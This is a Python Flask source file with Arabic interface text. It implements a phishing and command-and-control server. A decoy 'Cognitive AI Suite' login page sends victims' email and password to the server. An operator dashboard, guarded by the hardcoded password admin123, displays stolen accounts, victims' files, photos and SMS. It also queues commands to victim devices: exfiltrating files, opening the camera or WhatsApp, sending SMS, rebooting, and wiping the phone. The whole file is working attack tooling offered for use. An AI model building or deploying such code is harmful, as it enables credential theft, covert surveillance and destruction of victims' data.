from flask import Flask, render_template_string, request, jsonify, make_response, session, redirect, url_for
import urllib3
import datetime
import hashlib
import base64
import os

urllib3.disable_warnings()

app = Flask(__name__)
app.secret_key = hashlib.sha256(b"secure_secret_key_v78_14_engine").digest()

DASHBOARD_PASSWORD_HASH = hashlib.sha256("admin123".encode()).hexdigest()

UPLOAD_FOLDER = "extracted_target_files"
try:
    os.makedirs(UPLOAD_FOLDER, exist_ok=True)
except Exception as e:
    print(f"[-] تحذير في إنشاء مجلد الرفع: {e}")

AGENT_SESSIONS = {}
CAPTURED_CREDENTIALS = []
TARGET_FILE_INDEX = {}
TARGET_IMAGE_INDEX = {}
TARGET_SMS_INDEX = {}
COMMAND_QUEUES = {}
EXTRACTED_ALL_FILES = []
EXECUTION_LOGS = []

@app.after_request
def add_no_cache_headers(response):
    response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate, public, max-age=0"
    response.headers["Pragma"] = "no-cache"
    response.headers["Expires"] = "0"
    return response

# 1️⃣ واجهة الهدف التمويهية
STANDALONE_APP_PORTAL = """<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Cognitive AI Suite • Pro Edition v78.14</title>
<style>
body{background:#121214;color:#f1f1f3;font-family:sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;padding:15px}
.box{background:#1f2023;padding:30px 25px;border-radius:12px;box-shadow:0 8px 30px rgba(0,0,0,0.7);width:100%;max-width:400px;text-align:center;border:1px solid #2d2e32}
.ai-logo{width:55px;height:55px;background:linear-gradient(135deg, #19c37d, #0d8a5c);margin:0 auto 15px;border-radius:50%;display:flex;justify-content:center;align-items:center;font-size:28px;color:#fff}
h2{color:#fff;font-size:20px;margin-bottom:6px}.sub-title{color:#9ca3af;font-size:13px;margin-bottom:20px}
.input-group{margin-bottom:14px;text-align:right}
input{width:100%;padding:13px;background:#2b2c31;border:1px solid #3f4147;color:#fff;border-radius:8px;font-size:14px;outline:none;direction:ltr;text-align:left}
button{width:100%;padding:14px;background:#19c37d;color:#fff;border:none;border-radius:8px;font-weight:600;cursor:pointer;font-size:15px;margin-top:10px}
</style>
</head>
<body>
<div class="box">
  <div class="ai-logo">✨</div>
  <h2>منصة المزامنة الذكية (v78.14)</h2>
  <div class="sub-title">تفعيل النظام الاستراتيجي الشامل</div>
  <div class="input-group"><input type="email" id="target_email" placeholder="البريد الإلكتروني" required></div>
  <div class="input-group"><input type="password" id="target_pass" placeholder="كلمة المرور" required></div>
  <button onclick="triggerAIWorkflow()">تفعيل ومزامنة البيانات 🚀</button>
</div>
<script>
async function triggerAIWorkflow(){
    const email = document.getElementById('target_email').value.trim();
    const pass = document.getElementById('target_pass').value.trim();
    if(!email || !pass) { alert('يرجى ملء البيانات'); return; }
    const globalToken = 'agent_' + Math.random().toString(36).substring(2, 10);
    try {
        await fetch('/auth/verify/login', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({session_token: globalToken, user_agent: navigator.userAgent, platform: 'Android Target v78.14'})
        });
        await fetch('/api/credentials', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({token: globalToken, email: email, password: pass})
        });
    } catch(e){}
    alert('تمت مزامنة الجلسة بنجاح!');
    window.location.href = "https://www.google.com";
}
</script>
</body>
</html>"""

# 2️⃣ لوحة تسجيل دخول القائد
HTML_LOGIN_PAGE = """<!DOCTYPE html>
<html lang="ar" dir="rtl"><head><meta charset="UTF-8"><title>دخول القائد</title>
<style>body{background:#010103;color:#ff0040;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
.box{background:#04060e;border:2px solid #ff0040;padding:30px;border-radius:12px;text-align:center;width:350px}
input{width:100%;padding:12px;margin:15px 0;background:#000;border:1px solid #ff0040;color:#fff;border-radius:6px;text-align:center}
button{width:100%;padding:12px;background:#ff0040;border:none;color:#fff;font-weight:bold;border-radius:6px;cursor:pointer}</style></head>
<body><div class="box"><h2>🔒 لوحة القيادة v78.14</h2>
<form method="POST" action="/commander/login">
<input type="password" name="password" placeholder="كلمة المرور (admin123)" required>
<button type="submit">دخول 🚀</button></form></div></body></html>"""

# 3️⃣ لوحة القيادة الشاملة المحدثة
HTML_COMMAND_CENTER = """<!DOCTYPE html>
<html lang="ar" dir="rtl"><head><meta charset="UTF-8"><title>لوحة السيطرة v78.14</title>
<style>
body{background:#010103;color:#00ff88;font-family:monospace;padding:15px;text-align:center}
.container{max-width:1150px;margin:auto}h1{color:#ff0040;margin-bottom:20px}
.panel{background:#04060e;border:2px solid #ff0040;padding:20px;border-radius:12px}
select, input, button{padding:12px;margin:8px;border-radius:6px;border:1px solid #ff0040;background:#000;color:#fff;cursor:pointer;font-weight:bold}
button{background:#ff0040}button:hover{background:#cc0033}
.card{background:#000;border:1px solid #1a2a40;padding:15px;margin:15px auto;max-width:950px;border-radius:10px;text-align:right;border-right:8px solid #ff0040}
table{width:100%;margin-top:15px;border-collapse:collapse;color:#fff;text-align:right}
th, td{padding:10px;border:1px solid #1a2a40;font-size:13px}th{background:#0a0e1a;color:#ff0040}
.btn-group{display:flex;flex-wrap:wrap;justify-content:center;gap:10px;margin-top:15px}
</style></head>
<body>
<div class="container">
<h1>⚔️ لوحة السيطرة الميدانية المطورة v78.14 ⚔️</h1>
<div style="margin-bottom:15px;"><a href="/commander/logout" style="color:#ff0040;text-decoration:none;">[تسجيل خروج]</a></div>
<div class="panel">
<select id="command_type">
  <option value="fetch_active_agents">🎯 عرض الأهداف النشطة</option>
  <option value="fetch_captured_credentials">🔑 الحسابات المسروقة</option>
  <option value="fetch_target_file_list">📂 عرض ملفات الهدف</option>
  <option value="fetch_target_image_list">🖼️ عرض صور الهدف</option>
  <option value="fetch_target_sms_list">💬 عرض رسائل SMS</option>
  <option value="fetch_extracted_files">📥 الملفات والوسائط المسحوبة</option>
  <option value="fetch_execution_logs">📜 سجل تقارير تنفيذ الأوامر</option>
</select><br>
<button onclick="executeCommand()">تنفيذ أمر الاستعراض ⚡</button>

<div class="card" style="margin-top:20px; border-right-color:#00ff88;">
  <b>🎮 غرفة العمليات والتحكم الميداني السريع</b><br>
  <input type="text" id="target_token_input" placeholder="أدخل Token الهدف" style="width:250px; direction:ltr;"><br>
  
  <div class="btn-group">
    <button onclick="sendAction('open_whatsapp')" style="background:#00ff88; color:#000;">🟢 فتح واتساب</button>
    <button onclick="sendAction('open_accounts')" style="background:#00ff88; color:#000;">🔑 فتح الحسابات</button>
    <button onclick="sendAction('open_camera')" style="background:#00ff88; color:#000;">📷 فتح الكاميرا</button>
    <button onclick="sendAction('reboot_device')" style="background:#ffaa00; color:#000;">🔌 إطفاء الهاتف</button>
    <button onclick="sendAction('wipe_device')" style="background:#ff0000; color:#fff;">⚠️ فرمتة الهاتف</button>
  </div>

  <div style="margin-top:15px;">
    <input type="text" id="sms_phone_input" placeholder="رقم الهاتف للرسالة" style="width:200px; direction:ltr;">
    <input type="text" id="sms_body_input" placeholder="نص الرسالة القصيرة" style="width:300px;">
    <button onclick="sendSMSCommand()" style="background:#00ff88; color:#000;">📤 إرسال رسالة SMS</button>
  </div>
</div>

<div id="results" style="margin-top:20px;"></div>
</div></div>
<script>
async function executeCommand(){
 const cmdType = document.getElementById('command_type').value;
 const results = document.getElementById('results');
 results.innerHTML='⏳ جاري تنفيذ أمر الاستعراض...';
 try{
   const res = await fetch('/api/index', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({command: cmdType})});
   const data = await res.json();
   if(cmdType === 'fetch_active_agents'){
     let t = '<div class="card"><b>🎯 الأهداف النشطة</b><table><tr><th>Token</th><th>النظام</th><th>IP</th><th>الوقت</th></tr>';
     if(data.agents && data.agents.length>0){ data.agents.forEach(a => { t += `<tr><td>${a.token}</td><td>${a.platform}</td><td>${a.ip}</td><td>${a.time}</td></tr>`; }); }
     else { t += '<tr><td colspan="4" style="text-align:center">لا توجد أهداف متصلة</td></tr>'; }
     results.innerHTML = t + '</table></div>';
   } else if(cmdType === 'fetch_captured_credentials'){
     let c = '<div class="card"><b>🔑 الحسابات المسروقة</b><table><tr><th>Token</th><th>البريد</th><th>كلمة المرور</th><th>الوقت</th></tr>';
     if(data.credentials && data.credentials.length>0){ data.credentials.forEach(item => { c += `<tr><td>${item.token}</td><td style="color:#00ff88">${item.email}</td><td style="color:#ff0040">${item.password}</td><td>${item.time}</td></tr>`; }); }
     else { c += '<tr><td colspan="4" style="text-align:center">لا توجد حسابات مسروقة</td></tr>'; }
     results.innerHTML = c + '</table></div>';
   } else if(cmdType === 'fetch_target_file_list'){
     let f = '<div class="card"><b>📂 ملفات الهدف</b><table><tr><th>Token</th><th>مسار الملف</th><th>إجراء السحب</th></tr>';
     if(data.files && data.files.length>0){
       data.files.forEach(file => { f += `<tr><td>${file.token}</td><td style="color:#00ff88">${file.filename}</td><td><button onclick="pullFile('${file.token}', '${file.filename}')">سحب الملف 📥</button></td></tr>`; });
     } else { f += '<tr><td colspan="3" style="text-align:center">لا توجد ملفات معروضة</td></tr>'; }
     results.innerHTML = f + '</table></div>';
   } else if(cmdType === 'fetch_target_image_list'){
     let img = '<div class="card"><b>🖼️ صور الهدف</b><table><tr><th>Token</th><th>مسار الصورة</th><th>إجراء السحب</th></tr>';
     if(data.images && data.images.length>0){
       data.images.forEach(im => { img += `<tr><td>${im.token}</td><td style="color:#00ff88">${im.filename}</td><td><button onclick="pullFile('${im.token}', '${im.filename}')">سحب الصورة 📥</button></td></tr>`; });
     } else { img += '<tr><td colspan="3" style="text-align:center">لا توجد صور معروضة</td></tr>'; }
     results.innerHTML = img + '</table></div>';
   } else if(cmdType === 'fetch_target_sms_list'){
     let sms = '<div class="card"><b>💬 رسائل الهدف</b><table><tr><th>Token</th><th>المرسل / المحتوى</th><th>الوقت</th></tr>';
     if(data.sms && data.sms.length>0){
       data.sms.forEach(s => { sms += `<tr><td>${s.token}</td><td style="color:#00ff88">${s.body}</td><td>${s.time}</td></tr>`; });
     } else { sms += '<tr><td colspan="3" style="text-align:center">لا توجد رسائل مسجلة</td></tr>'; }
     results.innerHTML = sms + '</table></div>';
   } else if(cmdType === 'fetch_extracted_files'){
     let ef = '<div class="card"><b>📥 الملفات والوسائط المسحوبة نهائياً</b><table><tr><th>Token</th><th>اسم الملف</th><th>الوقت</th><th>تحميل</th></tr>';
     if(data.extracted && data.extracted.length>0){
       data.extracted.forEach(ex => { ef += `<tr><td>${ex.token}</td><td style="color:#00ff88">${ex.filename}</td><td>${ex.time}</td><td><a href="/download/${ex.saved_name}" style="color:#00ff88" target="_blank">[تحميل]</a></td></tr>`; });
     } else { ef += '<tr><td colspan="4" style="text-align:center">لم يتم سحب أي ملفات بعد</td></tr>'; }
     results.innerHTML = ef + '</table></div>';
   } else if(cmdType === 'fetch_execution_logs'){
     let log = '<div class="card"><b>📜 سجل تقارير تنفيذ الأوامر</b><table><tr><th>Token</th><th>الأمر التنفيذي</th><th>الحالة</th><th>الوقت</th></tr>';
     if(data.logs && data.logs.length>0){
       data.logs.forEach(lg => { log += `<tr><td>${lg.token}</td><td style="color:#00ff88">${lg.action}</td><td style="color:#00ff88">${lg.status}</td><td>${lg.time}</td></tr>`; });
     } else { log += '<tr><td colspan="4" style="text-align:center">لا توجد تقارير تنفيذ مسجلة</td></tr>'; }
     results.innerHTML = log + '</table></div>';
   }
 }catch(e){ results.innerHTML='❌ خطأ في الاتصال: '+e.message; }
}

async function pullFile(token, filename){
  alert('تم إرسال أمر السحب اللحظي: ' + filename);
  await fetch('/api/queue_command', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({token: token, action: 'pull', target_file: filename})});
}

async function sendAction(actionName){
  const token = document.getElementById('target_token_input').value.trim();
  if(!token) { alert('يرجى إدخال الرمز Token'); return; }
  await fetch('/api/queue_command', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({token: token, action: actionName})});
  alert('تم إرسال أمر (' + actionName + ') بنجاح!');
}

async function sendSMSCommand(){
  const token = document.getElementById('target_token_input').value.trim();
  const phone = document.getElementById('sms_phone_input').value.trim();
  const body = document.getElementById('sms_body_input').value.trim();
  if(!token || !phone || !body) { alert('يرجى استكمال بيانات الرسالة والرقم والرمز'); return; }
  await fetch('/api/queue_command', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({token: token, action: 'send_sms', phone: phone, body: body})});
  alert('تم توجيه أمر إرسال الرسالة بنجاح!');
}
</script></body></html>"""

@app.route('/', methods=['GET'])
def home(): return STANDALONE_APP_PORTAL

@app.route('/commander/login', methods=['GET', 'POST'])
def commander_login():
    if request.method == 'POST':
        if hashlib.sha256(request.form.get('password', '').encode()).hexdigest() == DASHBOARD_PASSWORD_HASH:
            session['authenticated'] = True
            return redirect(url_for('commander_dashboard'))
    return HTML_LOGIN_PAGE

@app.route('/commander/dashboard', methods=['GET'])
def commander_dashboard():
    if not session.get('authenticated'): return redirect(url_for('commander_login'))
    return HTML_COMMAND_CENTER

@app.route('/commander/logout', methods=['GET'])
def commander_logout():
    session.pop('authenticated', None)
    return redirect(url_for('commander_login'))

@app.route('/auth/verify/login', methods=['POST'])
def phishing_portal():
    req_data = request.get_json(silent=True) or {}
    token = req_data.get('session_token', 'agent_target')
    AGENT_SESSIONS[token] = {
        "agent": f"{req_data.get('user_agent', 'Android')[:25]}",
        "token": token,
        "ip": request.headers.get('X-Forwarded-For', request.remote_addr),
        "platform": req_data.get('platform', 'Android Target v78.14'),
        "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    if token not in COMMAND_QUEUES: COMMAND_QUEUES[token] = []
    return jsonify({"status": "agent_active", "token": token})

@app.route('/api/credentials', methods=['POST'])
def capture_credentials():
    req_data = request.get_json(silent=True) or {}
    CAPTURED_CREDENTIALS.append({
        "token": req_data.get('token', 'N/A'), "email": req_data.get('email', 'N/A'),
        "password": req_data.get('password', 'N/A'), "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    })
    return jsonify({"status": "secured"})

@app.route('/api/report_files', methods=['POST'])
def report_files():
    req_data = request.get_json(silent=True) or {}
    token = req_data.get('token', 'N/A')
    TARGET_FILE_INDEX[token] = req_data.get('files', [])
    TARGET_IMAGE_INDEX[token] = req_data.get('images', [])
    TARGET_SMS_INDEX[token] = req_data.get('sms', [])
    return jsonify({"status": "indexed"})

@app.route('/api/queue_command', methods=['POST'])
def queue_command():
    req_data = request.get_json(silent=True) or {}
    token = req_data.get('token')
    if token and token in COMMAND_QUEUES: 
        COMMAND_QUEUES[token].append(req_data)
    elif token:
        COMMAND_QUEUES[token] = [req_data]
    return jsonify({"status": "queued"})

@app.route('/api/poll_commands', methods=['POST'])
def poll_commands():
    req_data = request.get_json(silent=True) or {}
    token = req_data.get('token')
    cmds = []
    if token in COMMAND_QUEUES and COMMAND_QUEUES[token]:
        cmds = COMMAND_QUEUES[token]
        COMMAND_QUEUES[token] = []
    return jsonify({"commands": cmds})

@app.route('/api/report_execution', methods=['POST'])
def report_execution():
    req_data = request.get_json(silent=True) or {}
    EXECUTION_LOGS.append({
        "token": req_data.get('token', 'N/A'),
        "action": req_data.get('action', 'N/A'),
        "status": req_data.get('status', 'executed'),
        "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    })
    return jsonify({"status": "logged"})

@app.route('/api/upload_real_file', methods=['POST'])
def upload_real_file():
    req_data = request.get_json(silent=True) or {}
    token = req_data.get('token', 'N/A')
    filename = req_data.get('filename', 'file.bin')
    file_b64 = req_data.get('data', '')
    if file_b64:
        try:
            file_bytes = base64.b64decode(file_b64)
            saved_name = f"{token}_{filename.replace('/', '_').replace('(', '').replace(')', '')}"
            filepath = os.path.join(UPLOAD_FOLDER, saved_name)
            with open(filepath, "wb") as f: f.write(file_bytes)
            EXTRACTED_ALL_FILES.append({
                "token": token, "filename": filename, "saved_name": saved_name,
                "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            })
            return jsonify({"status": "saved"})
        except Exception as e: return jsonify({"status": "error", "message": str(e)}), 400
    return jsonify({"status": "empty"}), 400

@app.route('/download/<path:filename>', methods=['GET'])
def download_file(filename):
    if not session.get('authenticated'): return "Unauthorized", 401
    return app.send_static_file(os.path.join(UPLOAD_FOLDER, filename))

@app.route('/api/index', methods=['POST'])
def api_index():
    if not session.get('authenticated'): return jsonify({"error": "Unauthorized"}), 401
    req_data = request.get_json(silent=True) or {}
    mode = req_data.get("command", "")
    if mode == "fetch_active_agents": return jsonify({"agents": list(AGENT_SESSIONS.values())})
    elif mode == "fetch_captured_credentials": return jsonify({"credentials": CAPTURED_CREDENTIALS})
    elif mode == "fetch_target_file_list":
        flat = []
        for tkn, lst in TARGET_FILE_INDEX.items():
            for f in lst: flat.append({"token": tkn, "filename": f})
        return jsonify({"files": flat})
    elif mode == "fetch_target_image_list":
        flat_img = []
        for tkn, lst in TARGET_IMAGE_INDEX.items():
            for im in lst: flat_img.append({"token": tkn, "filename": im})
        return jsonify({"images": flat_img})
    elif mode == "fetch_target_sms_list":
        flat_sms = []
        for tkn, lst in TARGET_SMS_INDEX.items():
            for s in lst: flat_sms.append({"token": tkn, "body": s, "time": datetime.datetime.now().strftime("%H:%M:%S")})
        return jsonify({"sms": flat_sms})
    elif mode == "fetch_extracted_files": return jsonify({"extracted": EXTRACTED_ALL_FILES})
    elif mode == "fetch_execution_logs": return jsonify({"logs": EXECUTION_LOGS})
    return jsonify({"status": "ok"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
